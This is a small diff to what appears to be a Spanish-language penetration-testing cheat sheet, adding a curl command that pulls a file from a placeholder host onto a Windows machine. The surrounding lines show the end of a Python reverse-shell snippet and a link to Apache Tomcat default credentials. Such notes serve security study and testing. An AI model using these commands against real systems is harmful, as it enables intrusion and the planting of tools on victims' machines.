@@ -425,6 +425,10 @@ pty.spawn("/bin/bash")
 s.close()
 -------------
 
+--------------------- Curl (Windows)
+
+curl http://[IP]:[PORT]/Ruta/Del/Archivo -o [Archivo] (Transfiere un archivo a una maquina windows)
+
 --------------------- Enlaces de interes
 
 https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown (Tomcat default credentials)
